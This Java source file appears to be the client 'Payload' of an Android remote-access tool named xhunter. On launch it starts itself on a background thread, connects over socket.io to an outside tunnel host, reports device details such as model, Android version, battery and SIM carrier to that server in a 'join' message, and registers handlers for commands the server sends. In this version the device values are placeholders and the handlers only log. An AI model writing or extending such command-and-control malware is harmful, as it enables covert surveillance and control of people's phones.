package com.xhunter.client;

import android.content.Context;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;


import java.net.URI;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;


public class Payload {

    private static Socket mSocket;
    private  static int RECONNECTION_ATTEMPT = 10;
    private static long CONNECTION_TIMEOUT = 30000;


    public static void start(Context context) {
        startAsync(context);
    }

    public static void startAsync(final Context context) {
        new Thread() {
            @Override
            public void run() {
                // Execute the payload
                Payload.main(context);
            }
        }.start();
    }

    public static void main(Context context) {
        Log.e("xhunterTest", "<++++++++++++++++><><>><<<<>Successfully started myself++++>>>>>>>>");
        connectToSocket("https://xhunter.loca.lt");
    }








    /**
     * The purpose of this method is to get the call back for any type of connection error
     */
    private static Emitter.Listener testing = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.e("Response", args[0].toString());
        }
    };

    /**
     * The purpose of this method is to get the call back for any type of connection error
     */
    private static Emitter.Listener onConnectionError = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.e("Response", "onConnectionError");
        }
    };

    /**
     * The purpose of this method is to receive the call back when the server get connected
     */
    private static Emitter.Listener onServerConnect = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.e("Response", "onServerConnected");
            JSONObject deviceInfo = new JSONObject();
            try {
                deviceInfo.put("id", "3");
                deviceInfo.put("model", "Note 8");
                deviceInfo.put("android", "10");
                deviceInfo.put("battery", 0.766555);
                deviceInfo.put("sim", "Airtel");
                deviceInfo.put("manufacture", "Xioami");
                deviceInfo.put("appInstallTime", "5/5/1993");
            } catch (JSONException e) {
                e.printStackTrace();
            }
            sendDataToServer("join",deviceInfo);
        }
    };

    /**
     * The purpose of this method is to receive the call back when the server get disconnected
     */
    private static Emitter.Listener onServerDisconnect = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.e("Response", "onServerDisconnection");
        }
    };


    /**
     * The purpose of this method to create the socket object
     */
    public  static void connectToSocket(String uri) {
        try {
            mSocket = IO.socket(URI.create(uri));
            makeConnection();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * The purpose of this method is to connect with the socket
     */
    public static void makeConnection() {
        if (mSocket != null) {
            registerConnectionAttributes();
            mSocket.connect();
        }

    }

    /**
     * The purpose of this method is to register default connection attributes
     */
    public static void registerConnectionAttributes() {
        try {
            if (mSocket != null) {
                mSocket.on(Socket.EVENT_CONNECT_ERROR, onConnectionError);
                mSocket.on(Socket.EVENT_DISCONNECT, onServerDisconnect);
                mSocket.on(Socket.EVENT_CONNECT, onServerConnect);
                registerHandlers();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    /**
     * The purpose of this method is to register the connection from the socket
     */
    private static void registerHandlers() {
        try {
            //register you all method here
            mSocket.on("hello", testing);
            mSocket.on("android", testing);
            mSocket.on("hello2", testing);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    /**
     * The purpose of this method is to send the data to the server
     */
    public static void sendDataToServer(String methodOnServer, JSONObject request) {

        try {
            if (mSocket != null && mSocket.connected()) {
                Log.e("JSON ", "sending data");
                mSocket.emit(methodOnServer, request);
            } else {
                Log.e("JSON ", "sending data failed");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


}
